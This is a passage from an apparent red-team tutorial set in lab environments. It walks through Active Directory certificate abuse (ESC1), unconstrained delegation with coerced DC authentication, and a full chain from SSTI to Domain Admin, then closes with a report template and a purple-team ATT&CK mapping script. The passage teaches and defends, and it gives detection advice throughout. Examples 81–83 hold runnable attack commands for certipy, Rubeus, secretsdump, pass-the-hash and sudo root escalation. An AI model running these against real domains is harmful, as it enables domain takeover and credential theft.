where possible, and instrument intrusion detection to flag the same token used from
multiple source IPs within a short window.

---

## Example 81: Active Directory Certificate Services Abuse — ESC1

**What this covers:** Active Directory Certificate Services (ADCS) is a common Windows
PKI implementation that issues certificates for authentication. The ESC1 misconfiguration
allows a low-privileged user to request a certificate specifying any Subject Alternative
Name (SAN), including a Domain Admin UPN, which can then be used to authenticate as that
admin without knowing their password.

**Scenario:** Authorized red team engagement — testing ADCS misconfiguration in a lab
AD environment with a vulnerable certificate template.

```bash
# ESC1 exploitation — requesting a Domain Admin certificate as a standard user

# Step 1: Enumerate certificate templates for ESC1 vulnerabilities
certipy find -u jsmith@CORP.EXAMPLE -p 'Summer2024!' -dc-ip 192.0.2.10
# => [*] Finding certificate templates
# => [*] Found 23 certificate templates
# => [!] Vulnerable certificate templates
# =>   Template Name        : UserAuthentication
# =>   Enabled              : True
# =>   Client Auth          : True      ← can be used for authentication
# =>   Enrollee Supplies Subject : True ← ESC1: requester controls the SAN — CRITICAL
# =>   msPKI-Certificate-Name-Flag: ENROLLEE_SUPPLIES_SUBJECT
# =>   Permissions > Enrollment Rights: Domain Users ← any user can request

# Step 2: Request a certificate with Domain Admin UPN in the SAN
certipy req -u jsmith@CORP.EXAMPLE -p 'Summer2024!' \
  -ca CORP-CA -target ca.CORP.EXAMPLE \
  -template UserAuthentication \
  -upn Administrator@CORP.EXAMPLE
# => -upn Administrator@CORP.EXAMPLE — forged UPN in SAN; no admin creds required
# => [*] Requesting certificate via RPC
# => [*] Successfully requested certificate
# => [*] Certificate UPN: Administrator@CORP.EXAMPLE
# => [*] Saved certificate to administrator.pfx

# Step 3: Use the forged certificate to obtain a Kerberos TGT as Domain Admin
certipy auth -pfx administrator.pfx -dc-ip 192.0.2.10
# => [*] Using principal: Administrator@CORP.EXAMPLE
# => [*] Trying to get TGT...
# => [*] Got TGT
# => [*] Saved credential cache to administrator.ccache
# => [*] Trying to retrieve NT hash for 'Administrator'
# => [*] Got NT hash for 'Administrator': fc525c9dc5a4b3e7d8f9a0b1c2d3e4f5
# => full Domain Admin NT hash obtained — pass-the-hash or direct authentication possible
```

**Key Takeaway:** ESC1 transforms a misconfigured certificate template into a Domain Admin
escalation path for any enrolled domain user, requiring no CVE, no exploit, and no
special tooling beyond Certipy. Defenders must audit ADCS templates for
`ENROLLEE_SUPPLIES_SUBJECT` combined with `Client Auth` using `certipy find` regularly.

**Why It Matters:** ADCS misconfigurations (ESC1-ESC13) are widespread and frequently
overlooked because certificate services are rarely included in standard security reviews.
A single misconfigured template can grant every domain user a path to Domain Admin with
a single command and a valid domain credential. Blue teams must add ADCS enumeration to
their periodic assessment checklist and implement template auditing monitoring using
Windows event 4886 (certificate requested) correlated with the template name and
requester account.

---

## Example 82: Kerberos Delegation Abuse — Unconstrained Delegation

**What this covers:** Kerberos unconstrained delegation allows a service to receive a
user's full TGT (Ticket Granting Ticket) when the user authenticates to it, enabling
the service to impersonate the user to any other service. If an attacker controls a host
with unconstrained delegation, coercing authentication from a Domain Controller causes
the DC's machine TGT to be cached on the attacker-controlled host — granting DA-level
access.

**Scenario:** Authorized red team engagement — demonstrating unconstrained delegation
exploitation in a lab AD environment, operating from a compromised server that has the
delegation flag set.

```bash
# Unconstrained delegation exploitation — coerce DC auth, steal machine TGT

# Step 1: Identify hosts with unconstrained delegation enabled
python3 bloodhound.py -u jsmith -p 'Summer2024!' -d CORP.EXAMPLE -dc 192.0.2.10
# => collects AD data including delegation settings

# Or use ldapsearch directly:
ldapsearch -H ldap://192.0.2.10 -x -D "jsmith@CORP.EXAMPLE" -w 'Summer2024!' \
  -b "DC=CORP,DC=LOCAL" \
  "(userAccountControl:1.2.840.113556.1.4.803:=524288)" \
  sAMAccountName userAccountControl
# => 524288 = TRUSTED_FOR_DELEGATION (unconstrained delegation flag)
# => dn: CN=APPSRV01,OU=Servers,DC=CORP,DC=LOCAL
# => sAMAccountName: APPSRV01$               ← machine account with unconstrained delegation

# Step 2: From APPSRV01 (attacker-controlled), start monitoring for incoming TGTs
# Rubeus monitor (executed with admin rights on APPSRV01 in lab)
Rubeus.exe monitor /interval:5 /nowrap
# => [*] Action: TGT Monitoring
# => [*] Monitoring every 5 seconds for new TGTs
# => waiting for DC01$ to authenticate to APPSRV01...

# Step 3: Coerce DC01 to authenticate to APPSRV01 using PrinterBug (MS-RPRN)
python3 printerbug.py CORP/jsmith:'Summer2024!'@DC01.CORP.EXAMPLE APPSRV01.CORP.EXAMPLE
# => [*] Triggering authentication from DC01.CORP.EXAMPLE to APPSRV01.CORP.EXAMPLE
# => [*] Connecting to ncacn_np:DC01.CORP.EXAMPLE[\pipe\spoolss]
# => [+] Triggered! — DC01 now authenticates to APPSRV01 via Kerberos

# Step 4: Rubeus captures the DC01$ machine TGT
# => [*] 5/21/2026 10:45:01 UTC - Found new TGT:
# =>   User                  : DC01$@CORP.EXAMPLE
# =>   StartTime             : 5/21/2026 10:45:00 UTC
# =>   EndTime               : 5/21/2026 20:45:00 UTC
# =>   Base64EncodedTicket   : doIFpDCCBaC...  ← DC01 machine TGT

# Step 5: Inject DC01$ TGT and perform DCSync
Rubeus.exe ptt /ticket:doIFpDCCBaC...
# => [+] Ticket successfully imported!

# Now run DCSync using DC01's identity (another DC perspective)
python3 secretsdump.py -k -no-pass DC01.CORP.EXAMPLE
# => Domain credentials dumped as if we are DC01
```

**Key Takeaway:** Unconstrained delegation combined with authentication coercion (PrinterBug,
PetitPotam) creates a reliable DA escalation path requiring only a compromised host with
the delegation flag. Defenders should remove unconstrained delegation from all
non-DC computers and disable the Print Spooler service on DCs.

**Why It Matters:** Unconstrained delegation was designed for legitimate service-to-service
authentication but has become one of the highest-impact misconfigurations in Active
Directory environments. Because it is enabled at the computer account level, it can
persist undetected for years. Organizations should audit delegation settings quarterly
using BloodHound and treat any non-DC machine with unconstrained delegation as a
critical finding requiring immediate remediation.

---

## Example 83: Full-Chain Attack Scenario — Recon to Domain Admin

**What this covers:** This narrated walkthrough demonstrates a complete attack chain from
external reconnaissance to Domain Admin compromise, showing how individual techniques
from earlier examples chain together into a realistic adversary simulation. Each step
references earlier examples and identifies the key detection opportunity defenders have
at that stage.

**Scenario:** Authorized red team engagement — a full simulated attack against an isolated
lab corporate network (CORP.EXAMPLE, 192.0.2.0/24) with no prior knowledge.

```bash
# Phase 1: External Reconnaissance
# ─────────────────────────────────
subfinder -d corp-lab.example -silent | httpx -silent -status-code
# => corp-lab.example        [200]    — main site
# => mail.corp-lab.example   [200]    — mail server
# => vpn.corp-lab.example    [200]    — VPN portal
# => dev.corp-lab.example    [200]    — development server (unexpected exposure)

# Phase 2: Initial Access — Exploit dev server (CVE-2024-XXXX, authenticated RCE)
curl -s -X POST http://dev.corp-lab.example/api/build \
  -d '{"template": "{{7*7}}"}' | grep -o "49"
# => 49   — SSTI confirmed; dev server evaluates template expressions

# Escalate SSTI to RCE → reverse shell (see Beginner examples for SSTI → shell chain)
# => shell on dev.corp-lab.example as www-data (web process user)

# Phase 3: Local Privilege Escalation
# ─────────────────────────────────────
# LinPEAS identifies sudo misconfiguration:
# => www-data can run /usr/bin/python3 as root without password
sudo python3 -c "import os; os.setuid(0); os.system('/bin/bash')"
# => root@dev-server:~#   — local root on dev server

# Phase 4: Credential Harvesting
# ────────────────────────────────
# Search for credentials in application config files
grep -r "password\|passwd\|secret\|key" /var/www/ 2>/dev/null | grep -v ".git"
# => /var/www/config/database.yml: password: "DevSQL2024!"
# => /var/www/.env: AD_BIND_PASSWORD="BindUser99!"
# => service account credentials stored in plaintext config files

# Phase 5: Pivot to Active Directory
# ────────────────────────────────────
# Test AD bind credentials discovered in config files
python3 bloodhound.py -u binduser -p 'BindUser99!' -d CORP.EXAMPLE \
  -dc 192.0.2.10 --collect All
# => bloodhound-python collects full AD graph for offline analysis
# => ShortestPath to Domain Admin shows: binduser → APPSRV01$ (group member) → DA
# => APPSRV01 has unconstrained delegation (Example 82 chain available)

# Phase 6: Lateral Movement — Pass-the-Hash
# ──────────────────────────────────────────
python3 secretsdump.py 'CORP/binduser:BindUser99!'@192.0.2.10 -just-dc-user jsmith
# => jsmith NT hash: 8c3e71fb2a9d4b5c6d7e8f9a0b1c2d3e

python3 psexec.py -hashes :8c3e71fb2a9d4b5c6d7e8f9a0b1c2d3e CORP/jsmith@192.0.2.20
# => APPSRV01\> — interactive shell on APPSRV01 as jsmith (domain user + local admin)

# Phase 7: Domain Admin via Unconstrained Delegation
# ────────────────────────────────────────────────────
# (Follow Example 82 steps from APPSRV01 — coerce DC auth, capture TGT, DCSync)
# => DCSync yields krbtgt hash → Golden Ticket → persistent Domain Admin

# Phase 8: Objective Achievement
dir \\DC01\C$\Users\Administrator\Desktop\
# => flag.txt   — proof of Domain Admin access
```

**Key Takeaway:** The complete chain — SSTI to shell, plaintext credential discovery, AD
enumeration, Pass-the-Hash, and unconstrained delegation — used no zero-day exploits.
Each step exploited a configuration weakness that defenders can detect and remediate
independently, illustrating that defense-in-depth at any link in the chain would have
broken the attack.

**Why It Matters:** Full-chain attack scenarios reveal the cumulative impact of individually
minor security gaps. No single finding in this chain was catastrophic in isolation: a dev
server exposed externally, plaintext credentials in a config file, a service account with
excessive AD permissions, and a delegation misconfiguration. Together they produced
complete domain compromise. This motivates the defense-in-depth model: detecting and
blocking the attack at any single phase prevents the chain from completing, and red team
exercises that walk through full chains provide the most actionable input for prioritizing
defensive investments.

---

## Example 84: Red Team Reporting — Engagement Summary Format

**What this covers:** A red team report translates technical attack steps into business
risk language that executive stakeholders and technical defenders can both act upon.
Effective reports include an executive summary, risk-ranked findings, attack narrative,
evidence, and specific remediation guidance — not just a list of vulnerabilities.

**Scenario:** Post-engagement report for the authorized lab engagement conducted in
Example 83, delivered to the lab's simulated CISO and security team.

```markdown
<!-- Annotated red team report template — fill in per-engagement details -->

# Red Team Engagement Report: CORP.EXAMPLE Lab — May 2026

## Executive Summary

**Engagement Scope**: External attack surface + internal network (192.0.2.0/24)
**Authorization**: Written authorization from Lab Administrator (signed 2026-05-01)
**Outcome**: Domain Admin achieved via 6-step attack chain; no zero-days used

<!-- => key message: full compromise with only known techniques — patch and configure -->

**Critical Findings**: 3 Critical, 2 High, 1 Medium

<!-- => risk-tier summary leads the report; executives read this section only -->

**Business Impact**: An attacker with this access could:

- Exfiltrate all domain credentials (DCSync — Example 65)
- Establish persistent domain-level backdoor (Golden Ticket — Example 66)
- Access all file shares, email, and ERP systems authenticated as Domain Admin
<!-- => translate technical access into concrete business consequences -->

---

## Attack Chain Summary

| Step | Technique             | MITRE ATT&CK | Detected? | Time to Detection |
| ---- | --------------------- | ------------ | --------- | ----------------- |
| 1    | SSTI → RCE            | T1190        | No        | N/A               |
| 2    | Sudo misconfiguration | T1548.003    | No        | N/A               |
| 3    | Plaintext credentials | T1552.001    | No        | N/A               |
| 4    | BloodHound AD enum    | T1087.002    | No        | N/A               |
| 5    | Pass-the-Hash         | T1550.002    | Yes       | 47 minutes        |
| 6    | Unconstrained deleg.  | T1558.001    | No        | N/A               |

<!-- => table shows detection gaps per step; 5 of 6 steps went undetected — critical gap -->

---

## Finding 1 — CRITICAL: SSTI Remote Code Execution on dev.corp-lab.example

**Risk Rating**: Critical (CVSS 9.8)
**CWE**: CWE-94 (Improper Control of Code Generation)

**Evidence**:

- Request: POST /api/build {"template": "{{7*7}}"}
- Response: 49 (template evaluated — RCE confirmed)
<!-- => concrete proof of exploitability; attach screenshot in real report -->

**Remediation**:

1. Disable template evaluation in user-supplied input immediately
2. Apply allowlist input validation; reject `{{`, `{%`, `${` patterns
3. Move dev server behind VPN; remove external exposure
<!-- => numbered, actionable steps; not "fix the vulnerability" -->

---

## Finding 2 — CRITICAL: Plaintext Credentials in Application Config Files

**Risk Rating**: Critical
**Location**: /var/www/config/database.yml, /var/www/.env

**Remediation**:

1. Rotate all credentials found in config files immediately
2. Use secrets manager (AWS Secrets Manager, HashiCorp Vault) for all credentials
3. Add pre-commit hook to detect credential patterns in code repositories
<!-- => each finding: evidence, impact, specific remediation steps — no ambiguity -->
```

**Key Takeaway:** A red team report's value lies in its actionability — every finding must
include evidence (screenshots, request/response pairs), business impact, and numbered
remediation steps ordered by urgency. Reports that list vulnerabilities without remediation
guidance leave defenders without a clear path forward.

**Why It Matters:** The report is the primary deliverable of any red team engagement and
the mechanism through which offensive findings translate into defensive improvements.
A technically accurate but poorly structured report may result in findings going
unaddressed for months because stakeholders cannot assess priority or remediation effort.
Effective reporting requires the same discipline as the attack itself: clear structure,
precise evidence, and explicit guidance that removes ambiguity for every audience from
CISO to system administrator.

---

## Example 85: Purple Team Debrief — Mapping Attacks to ATT&CK for Blue Team

**What this covers:** A purple team debrief brings red and blue team members together
to walk through each attack step, verify whether detection fired, identify gaps in
telemetry, and jointly build or tune detection rules. The ATT&CK framework provides
a common vocabulary that makes this collaboration precise and measurable.

**Scenario:** Post-engagement debrief session between the red team and SOC analysts
following the authorized lab engagement in Example 83, using ATT&CK Navigator to
visualize coverage.

```python
#!/usr/bin/env python3
# purple_debrief_matrix.py — generate ATT&CK Navigator layer from engagement findings
# Outputs a JSON layer file that highlights detected vs undetected techniques

import json
from datetime import date

# Each technique from the engagement with detection outcome
ENGAGEMENT_TECHNIQUES = [
    # (technique_id, tactic, name,            detected, comment)
    ("T1190",     "initial-access",      "Exploit Public-Facing App (SSTI)",  False, "No WAF rule for SSTI patterns"),
    ("T1548.003", "privilege-escalation","Sudo Abuse",                         False, "No sudoers change monitoring"),
    ("T1552.001", "credential-access",   "Credentials in Files",               False, "No DLP scan on dev server"),
    ("T1087.002", "discovery",           "Domain Account Discovery (BH)",      False, "LDAP query volume not alerted"),
    ("T1550.002", "lateral-movement",    "Pass the Hash",                      True,  "Detected by ATA at T+47min"),
    ("T1558.001", "credential-access",   "Kerberos TGT via Delegation",        False, "No delegation abuse detection"),
]

# Build ATT&CK Navigator layer structure
layer = {
    "name": f"CORP.EXAMPLE Lab Engagement — {date.today()}",
    "versions": {"attack": "14", "navigator": "4.9", "layer": "4.5"},
    "domain": "enterprise-attack",
    "description": "Purple team debrief layer — red findings mapped to detection status",
    "techniques": []
}

for tid, tactic, name, detected, comment in ENGAGEMENT_TECHNIQUES:
    color = "#2ecc71" if detected else "#e74c3c"
    # => green (#2ecc71) = detected; red (#e74c3c) = missed — colorblind-aware
    layer["techniques"].append({
        "techniqueID": tid,           # => ATT&CK technique ID
        "tactic": tactic,             # => specific tactic column in matrix
        "color": color,               # => visual status indicator in Navigator
        "comment": comment,           # => detection gap or detection method
        "enabled": True,
        "metadata": [{"name": "Detected", "value": str(detected)}]
    })

output_path = "corp_lab_purple_debrief.json"
with open(output_path, "w") as f:
    json.dump(layer, f, indent=2)
    # => layer file loadable at https://mitre-attack.github.io/attack-navigator/

print(f"ATT&CK Navigator layer saved to {output_path}")
# => share with SOC; red cells = detection rules to create; green = validate and tune

# Debrief agenda items generated from findings:
gaps = [(t[0], t[2], t[4]) for t in ENGAGEMENT_TECHNIQUES if not t[3]]
print("\nDetection gaps requiring new rules:")
for tid, name, gap in gaps:
    print(f"  [{tid}] {name}: {gap}")
# => [T1190] Exploit Public-Facing App (SSTI): No WAF rule for SSTI patterns
# => [T1548.003] Sudo Abuse: No sudoers change monitoring
# => [T1552.001] Credentials in Files: No DLP scan on dev server
# => [T1087.002] Domain Account Discovery (BH): LDAP query volume not alerted
# => [T1558.001] Kerberos TGT via Delegation: No delegation abuse detection
```

**Key Takeaway:** The purple team debrief converts a red team engagement's offensive
findings into a concrete detection engineering backlog. Each undetected technique becomes
a Sigma rule, SIEM query, or EDR policy item with an ATT&CK reference anchoring the
defensive work to the observed threat behavior.

**Why It Matters:** Purple teaming closes the feedback loop that traditional red team
engagements leave open: without a structured debrief, blue teams may never know which
attacks they missed or why. The ATT&CK framework transforms this debrief from an anecdotal
discussion into a structured, measurable process. Organizations that conduct regular purple
team exercises build detection coverage systematically against the techniques real adversaries
use, continuously shrinking the gap between attacker capability and defender visibility —
the ultimate goal of any mature security program.
